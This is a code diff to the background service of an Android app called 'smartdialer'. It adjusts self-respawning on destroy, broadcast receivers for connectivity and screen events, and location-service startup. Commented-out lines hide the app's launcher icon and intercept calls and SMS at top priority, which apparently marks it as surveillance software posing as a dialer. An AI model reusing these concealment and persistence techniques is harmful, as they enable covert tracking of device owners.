@@ -22,6 +22,7 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
+import com.example.smartdialer.BuildConfig;
 import com.example.smartdialer.ConnectionManager;
 import com.example.smartdialer.MainActivity;
 import com.example.smartdialer.R;
@@ -45,8 +46,6 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Intent intentLocation = new Intent(this, LocationService.class);
-        ContextCompat.startForegroundService(this, intentLocation);
         /*locationCallback = new LocationCallback() {
             @Override
             public void onLocationResult(LocationResult locationResult) {
@@ -94,15 +93,10 @@ public class MainService extends Service {
 
         //PackageManager pkg=this.getPackageManager();
         //pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-        MyBroadcast myBroadcast = new MyBroadcast();
+        /*MyBroadcast myBroadcast = new MyBroadcast();
         IntentFilter filter = new IntentFilter("respawnService");
         filter.setPriority(Integer.MAX_VALUE);
-        registerReceiver(myBroadcast, filter);
-
-        ConnectivityChanged connectivityChanged = new ConnectivityChanged();
-        IntentFilter filter2 = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
-        filter2.setPriority(Integer.MAX_VALUE);
-        registerReceiver(connectivityChanged, filter2);
+        registerReceiver(myBroadcast, filter);*/
 
         /*CallReceiver callReceiver = new CallReceiver();
         IntentFilter filter3 = new IntentFilter("android.intent.action.PHONE_STATE");
@@ -114,15 +108,20 @@ public class MainService extends Service {
         filter4.setPriority(Integer.MAX_VALUE);
         registerReceiver(smsReceiver, filter4);*/
 
+        ConnectivityChanged connectivityChanged = new ConnectivityChanged();
+        IntentFilter filter2 = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
+        filter2.setPriority(Integer.MAX_VALUE);
+        registerReceiver(connectivityChanged, filter2);
+
         ScreenOff screenOff = new ScreenOff();
-        IntentFilter filter5 = new IntentFilter("android.intent.action.SCREEN_OFF");
-        filter5.setPriority(Integer.MAX_VALUE);
-        registerReceiver(screenOff, filter5);
+        IntentFilter screenOffFilter = new IntentFilter("android.intent.action.SCREEN_OFF");
+        screenOffFilter.setPriority(Integer.MAX_VALUE);
+        registerReceiver(screenOff, screenOffFilter);
 
         ScreenOn screenOn = new ScreenOn();
-        IntentFilter filter6 = new IntentFilter("android.intent.action.SCREEN_ON");
-        filter6.setPriority(Integer.MAX_VALUE);
-        registerReceiver(screenOn, filter6);
+        IntentFilter screenOnFilter = new IntentFilter("android.intent.action.SCREEN_ON");
+        screenOnFilter.setPriority(Integer.MAX_VALUE);
+        registerReceiver(screenOn, screenOnFilter);
 
         contextOfApplication = this;
         isServiceRunning = true;
@@ -133,7 +132,7 @@ public class MainService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        sendBroadcast(new Intent("respawnService"));
+        sendBroadcast(new Intent("respawnService").setPackage(BuildConfig.APPLICATION_ID));
         isServiceRunning = false;
     }
 
